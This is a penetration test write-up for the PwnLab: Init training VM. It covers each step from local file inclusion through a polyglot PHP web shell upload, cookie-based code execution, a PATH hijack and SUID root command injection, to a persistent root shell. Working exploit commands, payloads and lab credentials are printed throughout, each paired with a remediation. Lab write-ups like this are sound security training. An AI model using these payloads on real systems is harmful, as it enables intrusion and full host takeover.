# Penetration Test Report — PwnLab: Init

**Vulnerability Assessment & Penetration Test (VAPT)**
**Target:** PwnLab: Init (VulnHub — deliberately vulnerable training VM)
**Engagement type:** Educational / self-directed lab exercise (Capture-the-Flag, boot-to-root)
**Date:** 24 November 2026
**Prepared by:** Pratham Brahmbhatt — Aspiring Penetration Tester
**Classification:** Public (training write-up)

---

## ⚠️ Disclaimer & Authorisation

This assessment was performed against **PwnLab: Init**, a *deliberately vulnerable* virtual machine published by Claor on [VulnHub](https://www.vulnhub.com/entry/pwnlab-init,158/) for security education. All testing was conducted on **my own machine, inside an isolated VirtualBox lab network with no connection to any production or third-party system**. No real organisation, data, or user was involved or affected.

This report is published solely to demonstrate methodology and learning. The techniques shown must only ever be used against systems you own or are explicitly authorised in writing to test.

---

## 1. Executive Summary

PwnLab: Init was assessed in a full black-box, boot-to-root scenario. Starting with zero credentials and only network access, I achieved **full `root` (uid=0) compromise of the host**.

The compromise was not the result of a single flaw but of a **chain of seven distinct weaknesses**, each individually fixable, that together allowed an unauthenticated remote attacker to progress from "nothing" to "complete control." The root cause running through all of them is the same: **the application and host repeatedly trusted attacker-controlled input where it should have treated it as hostile** — in file paths, in stored secrets, in uploaded files, and in privileged binaries.

**Outcome:** Remote, unauthenticated attacker → remote code execution as `www-data` → lateral movement to three local users → `root`.

| Metric | Result |
|---|---|
| Highest privilege obtained | `root` (uid=0) |
| Initial access | Unauthenticated (via chained LFI + file upload) |
| Total findings | 7 (3 Critical, 3 High, 1 Medium) |
| Time to root | Single session |

---

## 2. Scope

| Item | Detail |
|---|---|
| Target host | PwnLab: Init VM — `192.168.2.11` |
| Attacker host | Kali Linux — `192.168.2.5` |
| Network | Isolated VirtualBox NAT network (`192.168.2.0/24`) |
| Rules of engagement | Full exploitation permitted; host is a disposable lab VM with a clean snapshot for rollback |
| Out of scope | Nothing outside the single target VM |

---

## 3. Methodology

Testing followed an industry-standard phased approach aligned with the **Penetration Testing Execution Standard (PTES)** and the **OWASP Testing Guide**:

1. **Reconnaissance** — network & service discovery
2. **Enumeration** — mapping application behaviour and trust boundaries
3. **Exploitation** — gaining an initial foothold (remote code execution)
4. **Post-exploitation / Privilege Escalation** — lateral movement and escalation to root
5. **Reporting & Remediation** — documenting findings and fixes

**Tooling:** `nmap`, `gobuster`, `curl`, `mysql` client, `netcat`, standard Linux utilities, Python (TTY upgrade).

---

## 4. Findings Overview

| # | Finding | Severity | CVSS v3.1 | CWE |
|---|---|---|---|---|
| F-01 | Local File Inclusion → source code disclosure (`page` parameter) | **High** | 7.5 | CWE-98 |
| F-02 | Hardcoded plaintext database credentials in web root | **High** | 7.5 | CWE-798 |
| F-03 | Reversible password storage (Base64, not hashed) | **Medium** | 5.3 | CWE-326 |
| F-04 | Unrestricted file upload (image-filter bypass via polyglot) | **Critical** | 9.8 | CWE-434 |
| F-05 | Unauthenticated file inclusion → Remote Code Execution (`lang` cookie) | **Critical** | 9.8 | CWE-94 |
| F-06 | Credential reuse (web ↔ operating system) | **High** | 8.8 | CWE-522 |
| F-07a | SUID binary using relative path → PATH hijack (local privesc) | **High** | 7.8 | CWE-426 |
| F-07b | SUID root binary command injection → root (local privesc) | **Critical** | 7.8 | CWE-78 |

---

## 5. Attack Narrative (Kill Chain)

```
Unauthenticated attacker
        │  F-01 LFI → read config.php (F-02 creds) & index.php (F-05 sink)
        ▼
Database read (F-03 base64 passwords decoded)
        │  F-04 polyglot upload  +  F-05 lang-cookie include
        ▼
Remote Code Execution as www-data
        │  F-06 password reuse → su kane
        ▼
kane
        │  F-07a PATH hijack on SUID msgmike
        ▼
mike
        │  F-07b command injection in SUID-root msg2root
        ▼
root (uid=0)  ✅
```

---

## 6. Detailed Findings

### F-01 — Local File Inclusion via `page` parameter (High)

**CVSS v3.1:** 7.5 — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`
**CWE-98:** Improper Control of Filename for Include/Require Statement in PHP

**Description.** `index.php` includes files based on the unvalidated `page` GET parameter (`include($_GET['page'].".php")`). Using PHP's `php://filter` wrapper, an attacker can read the Base64-encoded source of any PHP file instead of executing it.

**Evidence.**
```bash
curl -s "http://192.168.2.11/?page=php://filter/convert.base64-encode/resource=config" | base64 -d
```
Returned the full source of `config.php`.

**Impact.** Disclosure of all server-side source code, including database credentials and the logic later abused for RCE.

**Remediation.** Never build an `include`/`require` path from user input. Use a server-side whitelist mapping request values to fixed file names; disable `allow_url_include`; restrict PHP wrappers.

---

### F-02 — Hardcoded Plaintext Database Credentials (High)

**CVSS v3.1:** 7.5 — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`
**CWE-798:** Use of Hard-coded Credentials

**Description.** `config.php` stores the MySQL `root` account password in cleartext within the web root.

**Evidence (decoded via F-01).**
```php
$username = "root";
$password = "H4u%QJ_H99";
$database = "Users";
```

**Impact.** Full read/write access to the application database from the network (see F-06 chaining).

**Remediation.** Store secrets outside the web root (environment variables / secrets manager). Use a least-privilege application DB account, never `root`. Rotate exposed credentials.

---

### F-03 — Reversible Password Storage (Medium)

**CVSS v3.1:** 5.3 — `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`
**CWE-326:** Inadequate Encryption Strength (Base64 is encoding, not hashing)

**Description.** User passwords in the `users` table are stored Base64-encoded. Base64 is trivially reversible and provides no protection.

**Evidence.**
```bash
mysql --skip-ssl -h 192.168.2.11 -u root -pH4u%QJ_H99 -e "use Users; select user,pass from users;"
# stored value e.g. Sld6WHVCSkpOeQ==  ->  base64 -d  ->  JWzXuBJJNy
```

**Impact.** Any database read instantly yields every user's cleartext password.

**Remediation.** Hash passwords with a modern, salted, slow algorithm (bcrypt / Argon2id). Never store recoverable passwords.

---

### F-04 — Unrestricted File Upload via Polyglot (Critical)

**CVSS v3.1:** 9.8 — `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`
**CWE-434:** Unrestricted Upload of File with Dangerous Type

**Description.** `upload.php` validates files by extension, client-supplied `Content-Type`, and `getimagesize()`. All three are bypassable with a **GIF/PHP polyglot** — a file that is a valid GIF *and* contains PHP code.

**Evidence.**
```bash
printf 'GIF89a;\n<?php system($_GET["c"]); ?>\n' > shell.gif
curl -s -b cj.txt -F "file=@shell.gif;type=image/gif" -F "submit=Upload" "http://192.168.2.11/?page=upload"
```
File accepted and stored under `upload/<md5>.gif`.

**Impact.** Attacker-controlled code placed on the server; combined with F-05 this yields remote code execution.

**Remediation.** Validate uploads server-side by re-encoding the image, store uploads outside the web root with randomised names, strip execution permissions on the upload directory, and enforce an allow-list of safe types verified by content inspection.

---

### F-05 — Unauthenticated File Inclusion → RCE via `lang` Cookie (Critical)

**CVSS v3.1:** 9.8 — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
**CWE-94:** Improper Control of Generation of Code ('Code Injection')

**Description.** `index.php` includes `"lang/".$_COOKIE['lang']` with **no filtering and no extension appended**. An attacker can point this at the uploaded polyglot (F-04) to force PHP execution of their code.

**Evidence.**
```bash
curl -s -b "lang=../upload/<md5>.gif" "http://192.168.2.11/index.php?c=id"
# -> uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
Confirmed interactive shell via reverse connection to the attacker host.

**Impact.** Full remote code execution as the `www-data` service account — initial foothold on the host.

**Remediation.** Whitelist permitted language files; never include a raw cookie/user value. Treat all cookie data as untrusted input.

---

### F-06 — Credential Reuse Between Web App and OS (High)

**CVSS v3.1:** 8.8 — `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`
**CWE-522:** Insufficiently Protected Credentials

**Description.** The passwords recovered from the web database (F-03) are reused as **local Linux account passwords**, enabling `su` from the `www-data` foothold to a real interactive user.

**Evidence.**
```bash
su kane      # password: iSv5Ym2GRo (reused from web DB)
# -> kane@pwnlab
```

**Impact.** Lateral movement from an unprivileged service account to interactive user accounts.

**Remediation.** Enforce unique credentials per system; integrate centralised identity with MFA; monitor for password reuse.

---

### F-07a — SUID Binary with Relative Path → PATH Hijack (High)

**CVSS v3.1:** 7.8 — `AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`
**CWE-426:** Untrusted Search Path

**Description.** `/home/kane/msgmike` is SUID `mike` and invokes `cat` **without an absolute path**. By placing a malicious `cat` earlier in `$PATH`, the attacker executes arbitrary code as `mike`.

**Evidence.**
```bash
cd /tmp; echo '/bin/bash' > cat; chmod +x cat; export PATH=/tmp:$PATH
/home/kane/msgmike
# -> uid=1002(mike) gid=1002(mike) ...
```

**Impact.** Privilege escalation from `kane` to `mike`.

**Remediation.** In privileged binaries, call external programs by absolute path and sanitise the environment (`PATH`, `IFS`). Prefer dropping privileges and avoiding shell-outs entirely.

---

### F-07b — SUID Root Binary Command Injection → Root (Critical)

**CVSS v3.1:** 7.8 — `AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`
**CWE-78:** OS Command Injection

**Description.** `/home/mike/msg2root` is SUID **root** and passes user input directly into `system("/bin/echo <input> >> /root/messages.txt")`. A shell metacharacter (`;`) injects arbitrary commands executed as root.

**Evidence.**
```bash
echo 'x; cat /root/flag.txt; id' | /home/mike/msg2root
# -> euid=0(root) egid=0(root) ... and /root/flag.txt contents disclosed
```
A persistent root shell was obtained via a SUID copy of `bash`:
```bash
echo 'x; cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash' | /home/mike/msg2root
/tmp/rootbash -p   # euid=0(root)
```

**Impact.** Complete host compromise — full control as `root`.

**Remediation.** Never pass user input to `system()`/shell. Use parameterised APIs that separate command and data; validate/encode input; drop privileges before handling untrusted data.

---

## 7. Strategic Recommendations

1. **Treat all input as hostile** — the single theme behind every finding. Validate on the server, at every trust boundary (file paths, queries, uploads, privileged binaries).
2. **Secrets management** — remove hardcoded credentials; use least-privilege service accounts; keep secrets out of the web root.
3. **Modern password hashing** — bcrypt/Argon2id with per-user salt; never store reversible passwords.
4. **Harden file uploads** — re-encode, randomise names, store outside web root, forbid execution.
5. **Eliminate credential reuse** — unique secrets per system; add MFA.
6. **Audit SUID/privileged binaries** — absolute paths, sanitised environments, no shell-outs, no unsanitised input to `system()`.
7. **Defence in depth** — network segmentation (don't expose MySQL), least privilege, logging/monitoring so a single bug does not become a full chain to root.

---

## 8. Conclusion

A chain of common, well-understood web and Linux misconfigurations allowed full compromise of the host from an unauthenticated starting point. Each link in the chain maps to a documented CWE with a straightforward fix. The exercise reinforced a core lesson of offensive security: **individually "minor" issues combine into a critical breach**, and defence must therefore address the whole chain, not just the most severe single bug.

---

## Appendix A — Tools Used
`nmap` · `gobuster` · `curl` · `mysql` client · `netcat` · `python` (PTY) · standard GNU/Linux utilities

## Appendix B — References
- VulnHub — PwnLab: Init: https://www.vulnhub.com/entry/pwnlab-init,158/
- OWASP Top 10 — A03:2021 Injection, A05:2021 Security Misconfiguration
- MITRE CWE: CWE-78, CWE-94, CWE-98, CWE-326, CWE-426, CWE-434, CWE-522, CWE-798
- PTES — Penetration Testing Execution Standard

---

*Prepared as a personal skills-development write-up. Conducted entirely within an isolated, self-owned lab environment.*
